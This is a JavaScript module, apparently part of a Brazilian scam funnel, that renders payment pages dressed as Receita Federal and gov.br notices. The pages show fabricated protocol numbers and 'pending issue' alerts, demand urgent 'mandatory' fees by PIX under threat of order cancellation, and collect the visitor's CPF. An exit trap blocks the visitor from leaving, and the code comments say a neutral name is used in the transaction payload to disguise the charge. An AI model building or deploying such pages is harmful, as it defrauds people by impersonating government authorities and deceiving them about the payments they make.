/* =============================================================================
 * MOTOR DE UPSELL (MAC 2026) — renderiza uma pagina de upsell/downsell
 * inteira a partir de um objeto de configuracao (UPSELL_CONFIG).
 *
 * Beneficios:
 *  - Comportamento IDENTICO em todas as ~10 etapas (PIX, downsell, exit-trap).
 *  - Copy/tema por pagina fica num unico objeto de config (facil ajustar).
 *  - Nome REAL/persuasivo aparece na pagina (converte); o payload da transacao
 *    usa nome neutro forcado no servidor (api_proxy.php).
 *
 * Depende de: helpers.js (isValidCPF, startCountdown, initFaqAccordion,
 * bindCpfMask, initExitTrap) e pix.js (initPixPanel).
 * ========================================================================== */
(function () {
  'use strict';

  function esc(s) { var d = document.createElement('div'); d.textContent = (s == null ? '' : String(s)); return d.innerHTML; }
  function brl(v) { return 'R$ ' + Number(v).toFixed(2).replace('.', ','); }
  function rnd(n) { return String(Math.floor(Math.random() * n)); }
  function pad(n, l) { n = String(n); while (n.length < l) n = '0' + n; return n; }

  window.renderUpsell = function (cfg) {
    cfg = cfg || {};
    var accent = cfg.accent || '#1E40AF';
    var totalSteps = cfg.totalSteps || 10;
    var stepNum = cfg.stepNum || 1;
    var offer = cfg.offer || {};
    var ds = cfg.downsell || {};
    var docLeft = cfg.docLeft || 'gov<span style="color:#F5A623">.br</span>';
    var docRight = cfg.docRight || 'Receita Federal do Brasil';

    /* ---------- doc bar + header ---------- */
    var h = '';
    h += '<div class="flex items-center gap-2 px-4 py-1.5 text-white" style="background:#0d1f3d;font-size:10.5px;letter-spacing:.05em">'
      + '<span class="font-extrabold">' + docLeft + '</span><span style="opacity:.4">|</span><span>' + esc(docRight) + '</span></div>';
    h += '<header class="px-4 pb-3.5 pt-4 text-white" style="background:linear-gradient(180deg,#0A1628,#0F1F38)">'
      + '<div class="mx-auto flex max-w-xl items-center gap-3">'
      + '<div class="flex h-12 w-12 flex-shrink-0 items-center justify-center rounded-xl text-2xl" style="background:linear-gradient(135deg,#1A3A6B,#2B5EA7);box-shadow:inset 0 0 0 1px rgba(245,166,35,.4)">' + (cfg.icon || '\uD83C\uDFDB\uFE0F') + '</div>'
      + '<div><h1 class="font-extrabold leading-tight" style="font-size:13px">' + esc(cfg.headerTitle || '') + '</h1>'
      + '<p class="mt-0.5" style="font-size:11px;color:#a8c0e0">Protocolo oficial &bull; Processamento seguro</p></div></div></header>';
    h += '<div class="flex" style="height:6px"><span class="flex-1" style="background:#B71C1C"></span><span class="flex-1" style="background:#F5A623"></span><span class="flex-1" style="background:#B71C1C"></span></div>';

    h += '<div class="mx-auto max-w-xl px-3.5 pb-28 pt-4">';

    /* alert banner */
    h += '<div class="relative mb-4 overflow-hidden rounded-2xl p-4 text-white shadow-lg" style="background:linear-gradient(135deg,#D32F2F,#B71C1C)">'
      + '<span class="mb-2 inline-flex items-center gap-1.5 rounded-full px-2.5 py-1 font-bold uppercase" style="background:rgba(255,255,255,.15);font-size:10px;letter-spacing:.1em">&#9679; ' + esc(cfg.alertBadge || 'A\u00e7\u00e3o imediata necess\u00e1ria') + '</span>'
      + '<h2 class="font-black uppercase leading-tight" style="font-size:17px">' + (cfg.alertTitle || '') + '</h2>'
      + '<p class="mt-1.5 leading-relaxed" style="font-size:13px;opacity:.95">' + (cfg.alertText || '') + '</p></div>';

    /* protocol card */
    h += '<div class="mb-4 overflow-hidden rounded-2xl border border-gray-100 bg-white shadow-md">'
      + '<div class="flex items-center gap-2.5 px-4 py-3 text-white" style="background:#0A1628">'
      + '<span class="flex h-7 w-7 items-center justify-center rounded-md text-sm" style="background:rgba(245,166,35,.15)">&#128203;</span>'
      + '<span class="font-bold uppercase" style="font-size:12px;letter-spacing:.05em">Resultado da Consulta</span></div>'
      + '<div class="grid grid-cols-2 gap-px bg-gray-100" style="font-size:12px" id="protocol-grid"></div></div>';

    /* consequences */
    var cons = cfg.consequences || [];
    h += '<div class="mb-4 rounded-2xl border-l-4 border-red-500 bg-red-50 p-4">'
      + '<p class="mb-2.5 text-sm font-extrabold text-red-700">&#128680; ' + esc(cfg.consequencesTitle || 'Consequ\u00eancias se voc\u00ea n\u00e3o resolver agora') + '</p><ul class="space-y-2">';
    cons.forEach(function (c) {
      h += '<li class="flex items-start gap-2 leading-snug text-red-800" style="font-size:13px"><span class="font-black">!</span><span>' + esc(c) + '</span></li>';
    });
    h += '</ul></div>';

    /* with / without */
    var wo = cfg.without || [], wi = cfg.withNow || [];
    h += '<div class="mb-4 grid grid-cols-2 gap-3">'
      + '<div class="rounded-2xl border border-red-100 bg-white p-3.5"><p class="mb-2 font-extrabold text-red-600" style="font-size:12px">Sem resolver &#10060;</p><ul class="space-y-1.5">';
    wo.forEach(function (x) { h += '<li class="text-gray-500" style="font-size:11.5px;line-height:1.4">\u00b7 ' + esc(x) + '</li>'; });
    h += '</ul></div><div class="rounded-2xl border border-emerald-100 bg-white p-3.5"><p class="mb-2 font-extrabold text-emerald-600" style="font-size:12px">Resolvendo agora &#9989;</p><ul class="space-y-1.5">';
    wi.forEach(function (x) { h += '<li class="text-gray-600" style="font-size:11.5px;line-height:1.4">\u00b7 ' + esc(x) + '</li>'; });
    h += '</ul></div></div>';

    /* legal */
    if (cfg.legal) {
      h += '<div class="mb-4 rounded-2xl border border-gray-100 bg-white p-4">'
        + '<p class="mb-1.5 font-bold uppercase text-gray-400" style="font-size:11px;letter-spacing:.05em">Fundamenta\u00e7\u00e3o Legal</p>'
        + '<p class="leading-relaxed text-gray-500" style="font-size:12px">' + esc(cfg.legal) + '</p></div>';
    }

    /* offer + CTA */
    var fromPrice = offer.fromPrice ? '<p class="text-gray-400 line-through" style="font-size:13px">De ' + brl(offer.fromPrice) + '</p>' : '';
    var priceInt = Math.floor(offer.price);
    var priceCents = pad(Math.round((offer.price - priceInt) * 100), 2);
    h += '<div id="offer-section"><div class="overflow-hidden rounded-2xl border-2 bg-white shadow-lg" style="border-color:' + accent + '">'
      + '<div class="px-5 py-3 text-center text-white" style="background:' + accent + '"><span class="font-bold uppercase" style="font-size:12px;letter-spacing:.1em">' + esc(offer.badge || 'Procedimento Obrigat\u00f3rio') + '</span></div>'
      + '<div class="p-5 text-center">' + fromPrice
      + '<div class="my-1 flex items-end justify-center gap-1"><span class="text-xl font-bold text-gray-800">R$</span>'
      + '<span class="font-black leading-none text-gray-900" style="font-size:3rem">' + priceInt + '</span>'
      + '<span class="mb-1 font-black text-gray-900" style="font-size:1.5rem">,' + priceCents + '</span></div>'
      + '<p class="font-medium text-gray-500" style="font-size:12px">Taxa \u00fanica &bull; sem cobran\u00e7as futuras</p>'
      + (offer.microcopy ? '<p class="mt-2 rounded-lg bg-gray-50 px-3 py-2 leading-snug text-gray-500" style="font-size:11.5px">' + esc(offer.microcopy) + '</p>' : '')
      + '<div class="mt-4 rounded-xl bg-red-50 px-4 py-2.5"><p class="font-bold uppercase text-red-500" style="font-size:11px;letter-spacing:.05em">Tempo limite</p>'
      + '<p id="offer-timer" class="font-mono font-black text-red-600" style="font-size:1.5rem">07:00</p>'
      + '<p class="text-red-500" style="font-size:11px">' + esc(offer.timerNote || 'Resolva nos pr\u00f3ximos minutos ou seu pedido ser\u00e1 cancelado automaticamente.') + '</p></div>'
      + '<div id="cpf-gate" class="mt-4 rounded-xl border border-amber-200 bg-amber-50 p-3 text-left" style="display:none">'
      + '<label class="mb-1 block font-bold text-amber-800" style="font-size:12px">Informe seu CPF para emitir o PIX</label>'
      + '<input id="cpf-input" inputmode="numeric" placeholder="000.000.000-00" class="w-full rounded-lg border border-amber-300 bg-white px-3 py-2.5 text-center text-base font-bold tracking-wide text-gray-800 outline-none">'
      + '<p id="cpf-error" class="mt-1 font-medium text-red-600" style="font-size:12px;display:none"></p>'
      + '<button onclick="confirmCpf()" class="mt-2 w-full rounded-lg py-3 text-sm font-extrabold text-white" style="background:' + accent + '">Confirmar e gerar PIX</button></div>'
      + '<button id="main-cta" onclick="startUpsellPay(\'main\')" class="mt-4 w-full rounded-xl py-4 font-black text-white shadow-lg" style="font-size:15px;background:linear-gradient(135deg,#10B981,#059669)">' + esc(offer.ctaText || 'Resolver agora') + ' &mdash; ' + brl(offer.price) + '</button>'
      + '<div class="mt-3 flex flex-wrap items-center justify-center gap-x-3 gap-y-1 text-gray-400" style="font-size:10.5px"><span>&#128274; Ambiente seguro</span><span>&bull;</span><span>&#128737;&#65039; SSL 256 bits</span><span>&bull;</span><span>&#9889; Confirma\u00e7\u00e3o imediata</span></div>'
      + '<button onclick="showDownsellModal()" class="mt-3 font-medium text-gray-400 underline" style="font-size:12px">' + esc(cfg.refuseText || 'Recusar (meu pedido ser\u00e1 cancelado)') + '</button>'
      + '</div></div></div>';

    h += '<div id="pix-main" style="display:none"></div><div id="pix-downsell" style="display:none"></div>';

    /* FAQ */
    var faq = cfg.faq || [];
    if (faq.length) {
      h += '<div class="mt-6"><p class="mb-2 font-extrabold text-gray-700" style="font-size:13px">Perguntas Frequentes</p><div class="space-y-2">';
      faq.forEach(function (f) {
        h += '<div class="overflow-hidden rounded-xl border border-gray-100 bg-white">'
          + '<button class="faq-toggle flex w-full items-center justify-between gap-2 px-4 py-3 text-left"><span class="font-semibold text-gray-700" style="font-size:13px">' + esc(f.q) + '</span><span class="faq-icon text-lg text-gray-400">+</span></button>'
          + '<div class="faq-answer border-t border-gray-100 px-4 py-3 leading-relaxed text-gray-500" style="font-size:12.5px;display:none">' + esc(f.a) + '</div></div>';
      });
      h += '</div></div>';
    }

    /* trust */
    var trust = cfg.trust || ['Receita Federal', 'SEFAZ', 'SSL 256 bits', 'ICP-Brasil'];
    h += '<div class="mt-6 flex flex-wrap items-center justify-center gap-x-3 gap-y-1 text-gray-400" style="font-size:10.5px">';
    trust.forEach(function (t) { h += '<span>&#10003; ' + esc(t) + '</span>'; });
    h += '</div></div>';

    /* downsell modal */
    h += '<div id="downsell-modal" class="fixed inset-0 z-50 flex items-end justify-center p-3 sm:items-center" style="background:rgba(0,0,0,.6);display:none" onclick="closeDownsell()">'
      + '<div class="w-full max-w-md overflow-hidden rounded-2xl bg-white shadow-2xl" onclick="event.stopPropagation()">'
      + '<div class="px-5 py-3 text-center text-white" style="background:linear-gradient(135deg,#D32F2F,#B71C1C)"><span class="font-bold uppercase" style="font-size:11px;letter-spacing:.1em">&#9888;&#65039; \u00daltima chance</span></div>'
      + '<div class="p-5 text-center"><h3 class="text-lg font-black text-gray-900">' + esc(ds.title || '') + '</h3>'
      + '<p class="mt-1.5 leading-relaxed text-gray-600" style="font-size:13px">' + esc(ds.desc || '') + '</p>'
      + '<div class="my-3 flex items-end justify-center gap-1"><span class="text-sm text-gray-400 line-through">' + brl(offer.price) + '</span>'
      + '<span class="ml-2 font-black text-emerald-600" style="font-size:2.25rem">' + brl(ds.price) + '</span></div>'
      + '<button onclick="startUpsellPay(\'downsell\')" class="w-full rounded-xl py-4 font-black text-white shadow-lg" style="font-size:15px;background:linear-gradient(135deg,#10B981,#059669)">' + esc(ds.ctaText || 'Aproveitar agora') + ' \u2014 ' + brl(ds.price) + '</button>'
      + '<div class="mt-3 rounded-lg bg-red-50 px-3 py-2 font-medium leading-snug text-red-600" style="font-size:11.5px">' + esc(ds.warning || 'Se sair sem resolver, seu pedido ser\u00e1 cancelado e devolvido ao remetente. Sem reembolso.') + '</div>'
      + '<button onclick="skipToNext()" class="mt-3 text-gray-400 underline" style="font-size:12px">N\u00e3o quero, seguir mesmo assim</button>'
      + '</div></div></div>';

    var root = document.getElementById('upsell-root');
    root.innerHTML = h;

    /* ---------- behavior ---------- */
    bindCpfMask('cpf-input');
    startCountdown('offer-timer', offer.timerSeconds || 420);
    initFaqAccordion();

    // protocol grid
    (function () {
      var now = new Date();
      var proto = now.getFullYear() + '-' + pad(rnd(9999), 4) + '-' + pad(rnd(9999), 4);
      var pedido = 'IMP-' + pad(rnd(99999999), 8);
      var cod = pad(rnd(9999), 4) + '-' + String.fromCharCode(65 + Math.floor(Math.random() * 26)) + String.fromCharCode(65 + Math.floor(Math.random() * 26)) + String.fromCharCode(65 + Math.floor(Math.random() * 26));
      var dh = pad(now.getDate(), 2) + '/' + pad(now.getMonth() + 1, 2) + ' ' + pad(now.getHours(), 2) + ':' + pad(now.getMinutes(), 2);
      var grid = document.getElementById('protocol-grid');
      [['Protocolo', proto], ['Pedido n\u00ba', pedido], ['Cod. Verifica\u00e7\u00e3o', cod], ['Data / Hora', dh]].forEach(function (r) {
        grid.innerHTML += '<div class="bg-white px-4 py-2.5"><div class="uppercase text-gray-400" style="font-size:10px;letter-spacing:.05em">' + r[0] + '</div><div class="font-bold text-gray-800">' + r[1] + '</div></div>';
      });
      grid.innerHTML += '<div class="col-span-2 bg-white px-4 py-2.5"><div class="uppercase text-gray-400" style="font-size:10px;letter-spacing:.05em">Status</div><div class="font-extrabold text-red-600">Pend\u00eancia detectada \u2014 a\u00e7\u00e3o necess\u00e1ria</div></div>';
    })();

    var customerData = {
      name: localStorage.getItem('funil_nome') || 'Cliente allu',
      email: localStorage.getItem('funil_email') || '',
      phone: localStorage.getItem('funil_phone') || '',
      document: localStorage.getItem('funil_cpf') || ''
    };
    var sessionId = localStorage.getItem('funil_session') || '';
    var pendingTarget = null;

    window.startUpsellPay = function (target) {
      var gate = document.getElementById('cpf-gate');
      var doc = (customerData.document || (document.getElementById('cpf-input') ? document.getElementById('cpf-input').value : '')).replace(/\D/g, '');
      if (!doc || !isValidCPF(doc)) {
        gate.style.display = 'block';
        pendingTarget = target;
        var errEl = document.getElementById('cpf-error');
        if (doc) { errEl.textContent = 'CPF inv\u00e1lido. Confira os n\u00fameros.'; errEl.style.display = 'block'; }
        return;
      }
      customerData.document = doc;
      localStorage.setItem('funil_cpf', doc);
      launchPix(target);
    };

    window.confirmCpf = function () {
      var cpf = document.getElementById('cpf-input').value.replace(/\D/g, '');
      if (!isValidCPF(cpf)) {
        var errEl = document.getElementById('cpf-error');
        errEl.textContent = 'CPF inv\u00e1lido. Confira os n\u00fameros.';
        errEl.style.display = 'block';
        return;
      }
      document.getElementById('cpf-error').style.display = 'none';
      document.getElementById('cpf-gate').style.display = 'none';
      customerData.document = cpf;
      localStorage.setItem('funil_cpf', cpf);
      launchPix(pendingTarget || 'main');
    };

    function launchPix(target) {
      closeDownsell();
      var isDs = (target === 'downsell');
      var containerId = isDs ? 'pix-downsell' : 'pix-main';
      document.getElementById('offer-section').style.display = 'none';
      document.getElementById('pix-main').style.display = 'none';
      document.getElementById('pix-downsell').style.display = 'none';
      document.getElementById(containerId).style.display = 'block';
      initPixPanel(containerId, {
        productType: cfg.slug,
        productName: isDs ? (ds.title || cfg.productName) : cfg.productName,
        amount: isDs ? ds.price : offer.price,
        sessionId: sessionId,
        isUpsell: true,
        isDownsell: isDs,
        client: customerData,
        onPaid: function () { window.location.href = withUtms(cfg.nextUrl); },
        accent: accent,
        apiBase: '../../api_proxy.php'
      });
      window.scrollTo({ top: 99999, behavior: 'smooth' });
    }

    function withUtms(url) {
      if (!url) return url;
      var s = {};
      try { s = JSON.parse(localStorage.getItem('funil_utms') || '{}'); } catch(e){}
      try {
        if (window.location.search) {
          var cur = new URLSearchParams(window.location.search);
          cur.forEach(function(v, k) { if (!s[k]) s[k] = v; });
        }
      } catch(e) {}
      var keys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck','utm_id'];
      var q = [];
      keys.forEach(function(k){ if (s[k]) q.push(encodeURIComponent(k) + '=' + encodeURIComponent(s[k])); });
      if (!q.length) return url;
      var sep = url.indexOf('?') >= 0 ? '&' : '?';
      return url + sep + q.join('&');
    }

    window.showDownsellModal = function () { document.getElementById('downsell-modal').style.display = 'flex'; };
    window.closeDownsell = function () { document.getElementById('downsell-modal').style.display = 'none'; };
    window.skipToNext = function () { window.location.href = withUtms(cfg.nextUrl); };

    /* exit-trap: 1a saida -> downsell; 2a -> proxima etapa (nunca escapa) */
    initExitTrap({ onFirstExit: window.showDownsellModal, nextUrl: withUtms(cfg.nextUrl) });
  };
})();
